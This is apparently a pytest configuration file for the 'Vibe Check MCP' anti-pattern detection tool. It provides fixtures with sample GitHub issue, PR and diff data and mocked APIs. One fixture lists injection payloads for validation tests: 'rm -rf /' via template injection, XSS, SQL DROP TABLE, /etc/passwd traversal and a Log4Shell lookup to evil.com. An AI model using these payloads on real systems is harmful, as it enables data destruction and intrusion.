"""
Pytest Configuration and Fixtures for Vibe Check MCP Testing Suite

Provides shared fixtures, test configuration, and setup for comprehensive
testing across all test categories: unit, integration, security, performance,
edge cases, novel queries, and end-to-end tests.
"""

import pytest
import os
import sys
import tempfile
import json
import asyncio
import logging
from pathlib import Path
from typing import Dict, Any, List, Optional
from unittest.mock import MagicMock, patch, AsyncMock

# Add src to Python path for imports
src_path = Path(__file__).parent.parent / "src"
if str(src_path) not in sys.path:
    sys.path.insert(0, str(src_path))

# Add project root to Python path for validation module imports
project_root = Path(__file__).parent.parent
if str(project_root) not in sys.path:
    sys.path.insert(0, str(project_root))

# Test configuration
pytest_plugins = ["pytest_asyncio"]
TEST_DATA_DIR = Path(__file__).parent / "data"
TEST_DATA_DIR.mkdir(exist_ok=True)


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_github_token():
    """Mock GitHub token for testing"""
    return "test_github_token_12345"


@pytest.fixture
def sample_issue_data():
    """Sample GitHub issue data for comprehensive testing"""
    return {
        "number": 42,
        "title": "Feature: Add custom HTTP client for API integration",
        "body": """We need to build a custom HTTP client to handle our API requests.
        
        Requirements:
        - Custom retry logic
        - Authentication handling
        - Error handling
        - Rate limiting
        
        This will replace using the official SDK because it doesn't have all the features we need.""",
        "author": "testuser",
        "created_at": "2025-01-01T00:00:00Z",
        "updated_at": "2025-01-02T00:00:00Z",
        "state": "open",
        "labels": [{"name": "feature"}, {"name": "P2"}, {"name": "area:integration"}],
        "url": "https://github.com/test/repo/issues/42",
        "html_url": "https://github.com/test/repo/issues/42",
        "user": {"login": "testuser"},
        "assignees": [],
        "milestone": None,
        "comments": 0,
        "closed_at": None,
    }


@pytest.fixture
def sample_pr_data():
    """Sample GitHub PR data for comprehensive testing"""
    return {
        "number": 123,
        "title": "Implement custom authentication system",
        "body": """This PR implements a custom authentication system to replace the existing solution.
        
        Changes:
        - Custom JWT token handling
        - Database session management
        - Password hashing implementation
        - OAuth integration
        
        This replaces the third-party auth library because we need more control.""",
        "user": {"login": "contributor"},
        "state": "open",
        "created_at": "2025-01-01T00:00:00Z",
        "updated_at": "2025-01-02T00:00:00Z",
        "base": {"ref": "main", "sha": "abc123"},
        "head": {"ref": "feature/custom-auth", "sha": "def456"},
        "mergeable": True,
        "merged": False,
        "additions": 500,
        "deletions": 50,
        "changed_files": 12,
        "html_url": "https://github.com/test/repo/pull/123",
        "diff_url": "https://github.com/test/repo/pull/123.diff",
        "patch_url": "https://github.com/test/repo/pull/123.patch",
    }


@pytest.fixture
def sample_pr_diff():
    """Sample PR diff data for testing"""
    return '''diff --git a/src/auth/custom_auth.py b/src/auth/custom_auth.py
new file mode 100644
index 0000000..1234567
--- /dev/null
+++ b/src/auth/custom_auth.py
@@ -0,0 +1,50 @@
+"""
+Custom Authentication System Implementation
+"""
+
+import hashlib
+import jwt
+import secrets
+from typing import Dict, Any, Optional
+
+class CustomAuthenticator:
+    """Custom authentication implementation"""
+    
+    def __init__(self, secret_key: str):
+        self.secret_key = secret_key
+        
+    def hash_password(self, password: str) -> str:
+        """Hash password using custom implementation"""
+        salt = secrets.token_hex(16)
+        return hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000).hex()
+        
+    def generate_token(self, user_id: str) -> str:
+        """Generate JWT token"""
+        payload = {'user_id': user_id, 'exp': time.time() + 3600}
+        return jwt.encode(payload, self.secret_key, algorithm='HS256')
'''


@pytest.fixture
def mock_github_api():
    """Mock GitHub API responses"""
    mock_github = MagicMock()
    mock_repo = MagicMock()
    mock_github.get_repo.return_value = mock_repo
    return mock_github


@pytest.fixture
def mock_claude_api():
    """Mock Claude API responses"""
    mock_response = {
        "content": [{"text": "This is a mock Claude API response for testing."}],
        "usage": {"input_tokens": 100, "output_tokens": 50},
    }
    with patch("anthropic.Anthropic") as mock_claude:
        mock_claude.return_value.messages.create.return_value = mock_response
        yield mock_claude


@pytest.fixture
def temp_test_file():
    """Create temporary file for testing"""
    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".py") as f:
        f.write("# Test file content\nprint('Hello, World!')")
        temp_path = f.name

    yield temp_path

    # Cleanup
    if os.path.exists(temp_path):
        os.remove(temp_path)


@pytest.fixture
def temp_test_directory():
    """Create temporary directory for testing"""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def mock_mcp_server():
    """Mock MCP server for testing"""
    mock_server = MagicMock()
    mock_server.list_tools = AsyncMock(
        return_value=[
            {
                "name": "analyze_text_demo",
                "description": "Analyze text for anti-patterns",
            },
            {
                "name": "vibe_check_mentor",
                "description": "Collaborative reasoning mentor",
            },
        ]
    )
    return mock_server


@pytest.fixture
def sample_code_content():
    """Sample code content for analysis"""
    return '''
def process_data(data):
    """Process incoming data with custom implementation"""
    # Custom HTTP client instead of using requests library
    import urllib3
    http = urllib3.PoolManager()
    
    # Custom JSON parsing instead of using json module
    def parse_json(text):
        # Custom parser implementation
        result = {}
        # ... complex parsing logic ...
        return result
    
    # Custom authentication instead of OAuth library
    def authenticate():
        # Build custom auth flow
        token = generate_custom_token()
        return token
    
    return process_with_custom_logic(data)
'''


@pytest.fixture
def security_test_inputs():
    """Security-focused test inputs for validation testing"""
    return {
        "malicious_prompts": [
            "{{ system('rm -rf /') }}",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ],
        "large_inputs": "A" * 100000,  # 100KB input
        "special_characters": "αβγδε✓✗♠♣♥♦",
        "unicode_edge_cases": "\u0000\uffff\ud800\udfff",
    }


@pytest.fixture
def performance_test_data():
    """Performance testing data sets"""
    return {
        "small_pr": "+" * 1000,  # 1KB diff
        "medium_pr": "+" * 50000,  # 50KB diff
        "large_pr": "+" * 500000,  # 500KB diff
        "many_files": [f"file_{i}.py" for i in range(100)],
        "complex_analysis": {
            "issues": [
                f"Issue {i} with complex analysis requirements" for i in range(50)
            ],
            "nested_patterns": [
                "custom " * i + "implementation" for i in range(10, 100, 10)
            ],
        },
    }


@pytest.fixture
def edge_case_scenarios():
    """Edge case test scenarios"""
    return {
        "empty_content": "",
        "whitespace_only": "   \n\t  \n   ",
        "very_long_line": "x" * 10000,
        "unicode_content": "🚀 Unicode test with émojis and spéciál chars",
        "malformed_json": '{"incomplete": "json"',
        "null_bytes": "\x00\x01\x02",
        "control_characters": "\n\r\t\b\f",
    }


@pytest.fixture
def mock_external_services():
    """Mock external service dependencies"""
    mocks = {}

    # Mock GitHub API
    with patch("github.Github") as mock_github:
        mocks["github"] = mock_github

        # Mock Anthropic API
        with patch("anthropic.Anthropic") as mock_claude:
            mocks["claude"] = mock_claude

            # Mock subprocess calls (for Claude CLI)
            with patch("subprocess.run") as mock_subprocess:
                mocks["subprocess"] = mock_subprocess
                mock_subprocess.return_value.returncode = 0
                mock_subprocess.return_value.stdout = "Mock CLI output"

                yield mocks


@pytest.fixture(autouse=True)
def setup_test_logging():
    """Setup logging configuration for tests"""
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )

    # Suppress noisy third-party logs during testing
    logging.getLogger("urllib3").setLevel(logging.WARNING)
    logging.getLogger("github").setLevel(logging.WARNING)
    logging.getLogger("anthropic").setLevel(logging.WARNING)


@pytest.fixture
def test_config():
    """Test configuration settings"""
    return {
        "github_token": "test_token",
        "claude_api_key": "test_claude_key",
        "test_repository": "test/repo",
        "timeout_seconds": 30,
        "max_retries": 3,
        "rate_limit_per_minute": 60,
        "max_content_size": 100000,
    }


# Test data samples stored as fixtures
@pytest.fixture
def anti_pattern_examples():
    """Examples of anti-patterns for testing detection"""
    return {
        "infrastructure_without_implementation": [
            "build custom HTTP server instead of using SDK",
            "create our own authentication system",
            "implement custom database wrapper",
        ],
        "symptom_driven_development": [
            "add workaround for library bug",
            "patch the issue temporarily",
            "quick fix for production",
        ],
        "complexity_escalation": [
            "abstract factory for configuration",
            "strategy pattern for simple function",
            "observer pattern for single event",
        ],
        "documentation_neglect": [
            "couldn't find how to use the API",
            "documentation wasn't clear",
            "had to figure it out myself",
        ],
    }


@pytest.fixture
def good_pattern_examples():
    """Examples of good patterns that should pass validation"""
    return {
        "proper_research": [
            "checked the official documentation",
            "found the SDK has this feature",
            "official examples show this approach",
        ],
        "simple_solutions": [
            "use the existing library",
            "follow the standard pattern",
            "implement as documented",
        ],
        "justified_complexity": [
            "complex requirements demand this approach",
            "performance critical path needs optimization",
            "security requirements mandate custom solution",
        ],
    }
